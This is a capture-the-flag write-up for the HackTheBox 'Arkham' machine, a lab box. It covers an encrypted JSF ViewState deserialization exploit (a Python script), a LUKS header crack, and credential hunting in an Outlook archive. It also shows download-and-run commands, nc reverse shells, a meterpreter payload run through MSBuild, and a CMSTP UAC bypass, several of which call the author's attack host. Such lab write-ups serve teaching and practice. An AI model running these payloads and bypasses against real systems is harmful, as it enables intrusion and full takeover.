# Arkham [HTB](https://app.hackthebox.com/machines/179)
![arkham-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/arkham-01.png)


## Recon

After adding the target to my `/etc/hosts` file i fire off an `nmap` scan:

```bash
nmap -sC -sV -A -p- arkham.htb -oN nmap.result
```

![nmap-res-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/nmap-res-02.png)

We have the following:

+ An IIS v10.0 server on port 80.
+ An RPC endpoint-mapper on port 135.
+ NetBIOS on port 139.
+ An SMB server on port 445.
+ An Apache Tomcat server v8.5.37 on port 8080.
+ RPC related ports in 49666 & 49667.

Lets start by taking a quick look at the SMB server, maybe it allows unauthenticated access to system resources. 

After that we'll take a look at the HTTP servers. 

## SMB Port 445

Lets try to connect with a null session:

```bash
smbclient -N -L \\\\arkham.htb\\
```

![smb-list-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/smb-list-03.png)

We can see the target accepts null sessions. The `BatShare` looks unusual, can we connect to it?

```bash
smbclient -N  \\\\arkham.htb\\BatShare
```

![batshare-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/batshare-04.png)

Yes we can connect anonymously.

We have a single `zip` archive here, lets transfer it over to our attack machine and examine it. 

```bash
unzip appserver.zip
```

![unzip-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/unzip-05.png)

Looks like we have a `txt` file and a backup file. Lets read the `txt` file:

![note-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/note-06.png)

They mention a Linux server, although the target OS is Windows:

```bash
crackmapexec smb arkham.htb -u '' -p ''
```

![crackmap-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/crackmap-07.png)

Wierd, maybe the Apache server is running with `wsl`? at any case, lets check that backup file:

```bash
file backup.img
```
![luks-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/luks-08.png)

This is a block device encryptyed with [LUKS](https://en.wikipedia.org/wiki/Linux_Unified_Key_Setup), lets try to crack it. 

I did a bit of research into how we can crack this type of encryption, thats when i found [this](https://hashcat.net/forum/thread-6225.html) hashcat post.
Accourding to this post, the encryption and cipher types of our backup file are supported by `hashcat`. Later on in the post they mention how most linux filesystems place some sort of a header when formatting a file system using `mkfs.XXX`, therefore `hashcat` only needs the first 2MB of the drive in order to perform an entropy check and bypass the expansive 2nd PBKDF2 computation. 

We can devide a block device in linux using `dd`:

```bash
dd if=backup.img of=header.luks bs=512 count=4097
```

![dd-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/dd-09.png)

This will create a 2MB file which includes all the data `hashcat` needs to crack the master key. 

Now we can run a dictionary attack againts this file with:

```bash
hashcat -m 14600 -a 0 header.luks rockyou.txt
```

I run this on my host machine in order to utilize my GPU for the computation. After a couple of minutes we manage to find the master key:

![cracked-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/cracked-10.png)

Now we can decrypt the block device with:

```bash
cryptsetup luksOpen backup.img batshare
```

This prompts me for a password, so i type in `batmanforever`. The `batshare` argument is the name of the new block device to be created after decryption. 
Now we should be able to see the new device by running:

```bash
ls -al /dev/mapper
```

![mapper-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/mapper-11.png)

Lets mount this drive with:

```bash
mkdir /mnt/batshare
mount /dev/mapper/batshare /mnt/batshare
```

Now we can `cd` into this filesystem and have a look around:

![tree-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/tree-12.png)

Looks like the Apache server's configuration directory.

At first, i checked `tomcat-users.xml`, as it is possible to gain RCE via the [Tomcat Web Application Manager](https://tomcat.apache.org/tomcat-7.0-doc/html-manager-howto.html). The manager is an administrative featrue, designed to give administrators the ability to remotly manage the server, by adding/removing/modifying content, etc. 

If we have proper credentials of a user with admin roles which is configured in `tomcat-users.xml`, we can upload a `war` reverse shell with this command:

```bash
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"
```

Then we can run the file with the below command to give us a shell:

```bash
curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
```

Unfortunately for us, it doesnt seem like the users in this file are active, nor do they have admin roles:

![users-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/users-13.png)

We also need the manager portal which is usually under the `/manager/text` directory to be accesible, but in our case, it isnt.
I ran directory and file scans on the target, but i was not able to find the the `manager` endpoint. So i moved on.

Then i decided to take a look at `server.xml`:

![server-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/server-14.png)

I did a bit of research and i found a nice [artical](https://hackmag.com/security/apache-tomcat-rce/) that describes how the Apache Tomcat's AJP connector
can be exploited to retrive arbitrary files from the server, and if the server allows file uploads, this can be chained to gain RCE. 

In short, an unauthenticated attacker can send specially crafted AJP packets to a connector which by default, listenes on all IPv4 addresses on the localhost without an authorization secret to retrive files from the target. I've tested a couple of exploits againts our target, but they didnt work. 

Next, i turned to the `web.xml.bak` file, and this is where things started to get interesting. 

![faces-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/faces-15.png)

This configuration line establishes a new servlet class for the `*.faces` url pattern. So i decided to look around the site to find instances
of this pattern, until i found the `Subscribe` page:

![sub-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/sub-16.png)

If we type some text into the box and click the `Sign Up` button, we get redirected to the following page:

![thanks-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/thanks-17.png)

I wasn't sure exactly what these `.faces` files mean, so i decided to do a bit of research online, and that's where i started to find a lot of articals detailing exploits, like [this](https://dhiyaneshgeek.github.io/web/security/2021/05/08/demystifying-insecure-deserialisation-on-JSF-application/), and [this](https://www.exploit-db.com/docs/48126). 

In short, since `HTTP` is a stateless protocol, certian web servers implement a state management mechanisim in their application stack. With the objective of storing and restoring results of users actions that impacted the user interface of a web page, (The thank you page genereted based on our email input).

The Apache Tomcat is a pure Java server, and Java has `JavaServer Faces (JSF)` as its state management feature, This is where the `.faces` pages come in.
In pages where state managment is implemented, there will be a hidden field in the page named `javax.faces.ViewState`. 

If we refresh our request to the subscribe feature on our target and capture the request in `Burp` we can see the view state:

![viewstate-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/viewstate-18.png)


Why is this important? 

This `ViewState` field is a `serialized` Java object, and therefore, it could be vulnerable to [deserialization attacks](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html). 

These attacks are lethal as [insecure object deserialization](https://portswigger.net/web-security/deserialization) can lead to arbitrary command execution on the target OS. 

In short, application objects that are processed in memory can't be saved to storage or transmintted across the network as is, they have to get serialized. Once they reach thier target destination, the receving application has to deserialize the object in order to work with it in memory.

If we as attackers, can pass our own serialized objects to a target application, and that target application unsafely deserializes our object, we can inject commands in the object and have them executed by the target. 

This is what we want to do, and there are tools out there that can create these malicious java serialized objects for us, primarly the [ysoserial](https://github.com/frohoff/ysoserial) tool.

After i downloaded the tool i had issues running it. This happens becuase the tool doesnt run well on the latest versions of Java, [source](https://forum.portswigger.net/thread/ysoserial-stopped-working-b5a161f42f). There was also an [offical issue](https://github.com/frohoff/ysoserial/issues/205) on the Github of the project. The work around is to install `openjdk-11-jdk` and add that to our `$PATH` variable. 

So the workaround is

```bash
apt install openjdk-11-jdk
PATH=/usr/lib/jvm/java-11-openjdk-amd64/bin:$PATH 
```

And now we can run the `ysoserial` tool with:

```bash
java -jat ysoserial-all.jar <payload> <command>
```

In order to generate a serialized java object with `ysoserial` we need to select a payload type. Not to get to deep into it, but Java serialized objects are comprised from different classes, and these classes have to exist on our target applciation in order for the deserializaion attack to work. These classes are the different payload types we can choose with `ysoserial`.

After looking through `faces-config.xml` i chose the `BeanShell1` payload as it was mantioned in the config file:

![beans-18.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/beans-18.5.png)

Here is my syntax:

```bash
java -jar ysoserial-all.jar BeanShell1 'dir' | base64 -w 0
```

![first-attempt-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/first-attempt-19.png)

If we take this output, and paste that as the value for the `javax.faces.ViewState` field in our request to the server we can see the following:

![err-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/err-20.png)

Definitely a bug, but not RCE. I also generated a payload with `ping 10.10.14.61` as the command while capturing the icmp packets 
on my machine with `tcpdump - eth0 icmp`, in order to test for blind RCE, but nothing happened, why?

I decided to go back to the `web.xml.bak` file, and read through it. I also searched online and found [this](https://cwiki.apache.org/confluence/display/MYFACES2/Secure+Your+Application) post from Apache that explains the different parameters. 

Accourding to the post, encryption of the `MyFaces` serialized obejcts is enabled by default, with:

```xml
<context-param>
        <param-name>org.apache.myfaces.USE_ENCRYPTION</param-name>
        <param-value>true</param-value>
     </context-param>
```

I couldn't find this line in our config file, so i concluded that encryption is enbled implicitly on our target. Later on in the post they mention that the defualt encryption is `DES`, and since i couldnt find the encryption type explicitly defined in the config file, i concluded again that the encryption is set to `DES` implicitly. But the encryption key was explicitly defined in the config file:

![enc-key-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/enc-key-21.png)

This is `base64`, so we can run `echo 'SnNGOTg3Ni0=' | base64 -d` to decode it:

![decode-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/decdoe-22.png)

I also came to find that the serialized objects are signed with `SHA-1` for authintication:

![sha-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/sha-23.png)

The hashing key is the same as the encryption key. And now we understand why our first attempt didnt work. 
We didn't encrypt the payload nor did we sign it. 

The problem is that tools like `ysoserial` and `SerializationDumper` do not offer an option to encrypt the generated payloads, so we need to do that our selfs.

## Writing an Exploit

We know that we have both encryption and HMAC applied to the `viewstate` object, Lets start by understanding what HAMC is. 

HMAC (keyed-hash message authentication code) is used to validate the authinticity of a message using a shared secret instead of digital signitures. HMAC uses two passes of hash computation. Before either pass, the secret key is used to derive two keys – inner and outer. Next, the first pass of the hash algorithm produces an internal hash derived from the message and the inner key. The second pass produces the final HMAC code derived from the inner hash result and the outer key.

This hash digest is then appended to the messages itself either encrypted or not, and sent to the recipient. When the recipient receives the message,
they perfrom the hashing process themselves and compare the hased digest they produced with the one received from the message. If the two hash values match, the messege can be trusted. 

We know that a [SHA1](https://en.wikipedia.org/wiki/SHA-1) digest is 20-bytes long, but we need to determine if thoes 20 bytes are added to the start or the end of the message.  

We can determine this by hashing the message minus the first 20 bytes, and comparing the resulted digest to the first 20 bytes of the original messege.
If they match then we know its the hash digest and therefore we can conclude that the HMAC is added to the start of the message. 

If they dont match we can do the opposite, by computing the hash of the message minus the last 20 bytes, and comparing that againts the last 20 bytes of the original message, we can see if the two values match. If they do, then we know the digest is added to the end of the message. 

This in effect, is what each party is doing when validating the message, only they know where in the message the hash is added, and we dont, so we have to test both cases to see where the results match. 

Lets start analyzing, first we need to decode the object found in the HTTP post request, as there are URL encoded characters in the message like `%2B` which is `+`. We can do this with the `unquated_plus` class from the `urlib.parse` module in Python:

```python
>>> from urlib.parse import unquated_plus as urldecode
>>> message = 'wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RcJdqqT7ifhr70KtDtngjDm0mNzA9qHjYerxo0jW7zu1yeEFWecLimY1XY3Q%2BiON9uQYHUY%3D'
>>> b64 = urldecode(message)
>>> b64
'wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RcJdqqT7ifhr70KtDtngjDm0mNzA9qHjYerxo0jW7zu1yeEFWecLimY1XY3Q+iON9uQYHUY='
```

Now this data is base64 encoded, so we can use the `b64decode` class from the `base64` module to transform the data into raw bytes:

```python
>>> from base64 import b64decode
>>> raw = b64decode(b64)
>>> raw
b'\xc0z4\xc2b\xee\xe5\xc7\x88\xb4\x88\xbe#\xb5\xe4\x12-F\x01\xbe!\xd7e\x99\xf3\xde)\x03\xe6x8~\xdbr\x8d\xa3\\L\xb5E\xc2]\xaa\xa4\xfb\x89\xf8k\xefB\xad\x0e\xd9\xe0\x8c9\xb4\x98\xdc\xc0\xf6\xa1\xe3a\xea\xf1\xa3H\xd6\xef;\xb5\xc9\xe1\x05Y\xe7\x0b\x8af5]\x8d\xd0\xfa#\x8d\xf6\xe4\x18\x1dF'
```
 
Now we have the raw DES cipher and the SHA1 digest in bytes, lets see what's what. To produce the HMAC we can use the `hmac` module. 
Lets start by focusing on the first 20 bytes:

```python
>>> import hmac
>>> digest = raw[:20]       # set first the 20 bytes of the message as the hash digest
>>> msg = raw[20:]	    # treat everything after the first 20 bytes as the encrypted message
>>> hmac.new(b'JsF9876-', msg, 'sha1').digest()  # compute the hash of msg
b'\xa4\x87<\xd5\x1cp"\xad7\xd3g\xc3\xd2\xab\xa3\x03IG\xcb_'
>>> digest
b'\xc0z4\xc2b\xee\xe5\xc7\x88\xb4\x88\xbe#\xb5\xe4\x12-F\x01\xbe'  # Not the same
```

So we can see that the first 20 bytes didnt match the hash, lets try the last 20 bytes:

```python
>>> digest = raw[-20:]   # Set last 20 bytes as the digest
>>> msg = raw[:-20]      # Set the remaining bytes as the encrypted message
>>> hmac.new(b'JsF9876-', msg, 'sha1').digest()
b'\xc9\xe1\x05Y\xe7\x0b\x8af5]\x8d\xd0\xfa#\x8d\xf6\xe4\x18\x1dF'
>>> digest 
b'\xc9\xe1\x05Y\xe7\x0b\x8af5]\x8d\xd0\xfa#\x8d\xf6\xe4\x18\x1dF'   # same
```

Now we can see they match, so we've confirmd that the last 20 bytes of the message is the hash digest. Now we can decrypt the rest of the message.
For this i will use the [Cryptodome](https://pypi.org/project/pycryptodome/) module in Python (you can also use `Crypto`, for me it causes issues).

```python
>>> from Cryptodome.Cipher import DES
>>> d = DES.new(b'JsF9876-', DES.MODE_ECB)
>>> d.decrypt(msg)
b'\xac\xed\x00\x05ur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x03t\x00\x01cpt\x00\x12/userSubscribe.jsp\x02\x02'
```

And there it is, we can see that our process was successful, as we can see the `java.lang.Object` sting in the output. Also, accourding to [this post](https://maxchadwick.xyz/blog/java-serialized-object-detection), serialized java object contain a header called `STREAM_MAGIC` which should be equal to `aced` in hex, which matchs our result. 

Now we can move on to the final stage were we contruct our payload, here is the overview:

+ generate a serilzed java object using `ysoserial`, and save it to a file: 

```bash
java -jar ysoserial-all.jar BeanShell1 'ping 10.10.14.61' > payload.bin
```

+ Open `payload.bin` from our Python script, and pad it with 8 bytes so we can encrypt the contents nicely with DES.

+ Compute the `SHA1` digest and add that to the end of the message.
+ Base64 encode it the object. 
+ Send it with `requests` which will also url encode it.

Here is the script:

```python
#!/usr/bin/python3

import base64
import hmac
import requests
from Cryptodome.Cipher import DES

with open('payload.bin', 'rb') as file:
    payload = file.read()

pad = (8 - (len(payload) % 8)) % 8
padded = payload + (chr(pad)*pad).encode()

d = DES.new(b'JsF9876-', DES.MODE_ECB)
encrypted_payload = d.encrypt(padded)
digest = hmac.new(b'JsF9876-', encrypted_payload, 'sha1').digest()

viewstate = base64.b64encode(encrypted_payload + digest)

sess = requests.session()
sess.get('http://arkham.htb:8080/userSubscribe.faces')
response = sess.post('http://arkham.htb:8080/userSubscribe.faces',
            data = {'j_id_jsp_1623871077_1%3Aemail': 'd',
                    'j_id_jsp_1623871077_1%3Asubmit': 'SIGN+UP',
                    'j_id_jsp_1623871077_1_SUBMIT': '1',
                    'javax.faces.ViewState': viewstate
                    }
    )
```

I setup `tcpdump -i eth0 icmp` and run the script but nothing happens. So i decide to try a different payload type with `ysoserial`.

After some time i found that `CommonColletion5` gets me a ping.

```bash
java -jar ysoserial-all.jar CommonsCollections5 'ping 10.10.14.61' > payload.bin
```

![rce-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/rce-25.png)

Now we need to find a working payload for a reverse shell. At first i tried to host `nishang`'s reverse powershell script on a python web server, and download it from the target but that didnt work. Then i tried to host the same file through an SMB share, the target did connect to my share, but didnt get the file nor did it execute it.

So instead i decided to download `nc64.exe` to the target with:

```bash
java -jar ysoserial-all.jar CommonsCollections5 'powershell -exec bypass -c Invoke-WebRequest -uri "http://10.10.14.61/nc64.exe" -outfile \windows\System32\spool\drivers\color\n.exe' > payload.bin
```

This worked, as the target retrieved the file. Then i setup the reverse shell payload with:

```bash
java -jar ysoserial-all.jar CommonsCollections5 '\windows\System32\spool\drivers\color\n.exe -e cmd 10.10.14.61 443' > payload.bin
```

i start my listener with:

```bash
rlwrap nc -lnvp 443
```

And execute:

![shell-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/shell-27.png)

And finally, we get a shell. 

## Privilege Escalation

At first i tried to catch quick wins with `whoami /priv` and `cmdkey /list`, but they came up empty. 

Then i started to look around the system, and that's when i found `C:\Windows\Panther\Unattended.xml`. Inside it i saw an interesting user account:

![unattended-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/unattended-28.png)

The `Batman` user is an admin on the machine, if we can get his password we can try to run `psexec` to elevate privileges. 
I tired to hunt for his passowrd in the registry with `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`, there was an entry for his user, but no password. 

I wondered around the filesystem for a while, looking through potentially interesting files, but found nothing useful. So i decide to shift gears and run [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) instead.

I tried to download it from my kali machine and execute it with one command:

```cmd
powershell --exec bypass IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.61/PowerUp.ps1'); Invoke-AllChecks
```

But this gave the following error:

![err-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/err-29.png)

Looks like we might be dealing with a constrained powershell environment, we can check this by running:

```cmd
powershell -exec bypass $ExecutionContext.SessionState.LanguageMode
```

![restricted-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/restricted-30.png)

Yep, this is why our initial reverse shell payloads didnt work. I found [this](https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass) artical that talks about how this can be circumvented. They suggest to run `powershell -version 2`, in our case it doesnt work:

![ps-v2-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/ps-v2-31.png)

But they also mention that we can bypass the constrained language mode by adding the string `system32` to our script name, like `system32.ps1`,
I gave it a shot and ran `PowerUp` on the target, but that didnt yield anything useful. I also tried `winPEASx64.exe` but that didnt work as well.

So i decided to look through the filesystem again, this time i decided to focus on my user's home folder. Where i found an unusual folder in `C:\Users\alfred\Downloads\backups\`

![backups-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/backup-32.png)

I tried to get the file to my Kali machine using an FTP server, didnt work, so i used `impacket-smbserver` instead.
We need to setup credentials to access the share otherwise the target machine will block the connection:

```bash
impacket-smbserver -smb2support -username htb -password htb arkham .
```

Next we connect to the share from the target using:

```cmd
net use \\10.10.14.61\arkham /u:htb htb
```

Now we can copy the `backup.zip` file to the Kali machine with:

```cmd
copy backup.zip \\10.10.14.61\\arkham
```

![copy-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/copy-33.png)

Lets analyze this file. If we list the contents of the archive with `unzip -l backup.zip` we can see:

![ost-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/ost-34.png)

We have an `.ost` file, which is a Microsoft Outlook email folder. we can open this on linux with `readpst`, which reads both `pst` as well as `ost` files.

```bash
unzip backup.zip
readpst alfred@arkham.local.ost
```

![readpst-35](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/readpst-35.png)

This created a `Drafts.mbox` file in my working directory:

![drafts-36](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/drafts-36.png)

We can open this file with `mutt` as such:

```bash
mutt -R -f Drafts.mbox
```

![mbox-37](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/mbox-37.png)

If we hit Enter to view the message, we see a bunch of HTML code, but down at the buttom we see an attachment:

![img-38](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/img-38.png)

Lets hit `v` to view the image:

![pass-39](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/pass-39.png)

The password for `Batman`'s account is `Zx^#QZX+T!123`. I tried `psexec` and other methods from `impacket` to get a shell  but they all failed.
Instead we can use `New-PSession` cmdlet from powershell to start a session as another user. 

```cmd
powershell
PS> $username = "arkham\batman"
PS> $password = "Zx^#QZX+T!123"
PS> $secstr = New-Object -TypeName System.Security.SecureString
PS> $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
PS> new-pssession -computername . -credential $cred
PS> enter-pssession 1
```

This should give you a new powershell session as `Batman`:

![batman-40](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/batman-40.png)

This shell was very slow to me, so i ran `nc` to connect back to my machine:

```cmd
\windows\System32\spool\drivers\color\n.exe -e cmd 10.10.14.61 444
```

![batshell-41](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/batshell-41.png)


Alternatively, we could have made a connection using `WinRM`, as it seems that the target is listening for connections on port `5985`:

![winrm-42](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/iwnrm-42.png)

To do this we can use [chisel](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html), or [plink](https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-plink) for port forwarding, and then use [evil-winrm](https://github.com/Hackplayers/evil-winrm) to connect as the `Batman` user. 


## UAC Bypass

After landing a shell as the `Batman` user, we can in fact go into the `Administrator`'s desktop to get `root.txt`.
However, If you pay close attention, we are still in a low privilege shell:

![low-priv-43](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/low-priv-43.png)

If this was a true admin shell, we would have had a lot more privileges. Not only that, but the powershell is still in a constrained mode:

![constrained-44](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/constrained-44.png)

In order to break out of the constrained powershell, we can use [PSByPassCLM](https://github.com/padovah4ck/PSByPassCLM), however in this case it wont help us. To really bypass the UAC we need to switch to an interactive process. The easiest way to do that would be Metasploit with GreatSCT, which is a tool used to generate metasploit payload that bypass anti-viruses and white listings.

First step, clone [GreatSCT](https://github.com/GreatSCT/GreatSCT) to your `/opt` folder:

```bash
cd /opt
git clone https://github.com/GreatSCT/GreatSCT.git
```
![clone-45](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/clone-45.png)

Now run the setup script:

```bash
cd GreatSCT/setup
./setup.sh -c
```

Could take a mintue or two. Once it's installed start the program with `/GreatSCT.py`. If its your first time, you can scroll around the different options with the `list` and `info` commands. In our case we want to select `use bypass`, which will load the bypass payloads:

![bypass-46](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/bypass-46.png)

Now we run `list` to list out the available payloads:

![list-47](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/list-47.png)

There are more payloads at the buttom, but we are going to use this one. Run `use msbuild/meterpreter/rev_tcp.py` to start the setup. This will open a metasploit type payload configuration page where we can input our `LHOST` and `LPORT`:

![setup-48](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/setup-48.png)

After that we are ready to generate the payload so type `generate` and hit enter. It then asks for a base name for the file so i type `arkham`. 

Then we can press `Enter` to go back to the main menu, and then we can type `exit` to close the program.

This process should have proceduced a metasploit file under `/usr/share/greatsct-output/handlers/`:

![payload-49](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/payload-49.png)

And a source code file to transfer to the target under `/usr/share/greatsct-output/source/`:

![source-49.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/source-49.5.png)

Lets trasnfer both files to our working directory and start metasploit with this `rc` file:

```bash
msfconsole -r arkham.rc
```

![msf-50](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/msf-50.png)

Now lets transfer the `arkham.xml` to the target with:

```cmd
powershell -c iwr -uri 10.10.14.61/arkham.xml -outfile a.xml
```

Now we are ready to execute, from the target use `MSBuild.exe` againts the `xml` file:

```cmd
\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \Users\Batman\appdata\local\temp\a.xml
```

This freezes the connection, but metasploit got a connection:

![conn-52](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/conn-52.png)

Now lets enter the session with `sessions -i 1` and load powershell:

![full-53](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/full-53.png)

The first time i did this the session died on me, but this spwned a seconed session and this time it worked. 

Now we want to migrate to an interactive and a x64 process, `explorer.exe` is an easy choice:

![migrate-54](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/migrate-54.png)


Now we have an interactive process with full powershell capabilities, so we can finally bypass any UAC's with CMSTP.


## CMSTP UAC Bypass

[This artical](https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html) explains the attack process in a more detailed way. In short, we are going to transfer some C-sharp source code to the target and compile it to a dll with powershell. 

The file we need to upload is `Sourece.cs`, lets transfer it to the target with:

```powershell
iwr -uri 10.10.14.61/Source.cs -outfile C:\\Users\Batman\AppData\Local\temp\Source.cs
```

Now we compile it with:

```powerhsell
cd c:\\users\Batman\AppData\Local\Temp
Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "CMSTP-UAC-Bypass.dll"
```

This should create the dll file: 

![ls-55](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/ls-55.png)


Now we load the dll into memory:

```powershell
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\CMSTP-UAC-Bypass.dll"))
```

![load-56](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/load-56.png)


And then we call the exported function, passig in the command we want to run, which in our case is `nc.exe` for a reverse shell. 

```powershell
[CMSTPBypass]::Execute("C:\windows\System32\spool\drivers\color\n.exe -e cmd 10.10.14.61 9001")
```

This give me a fully privileges shell:

![root-57](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/root-57.png)
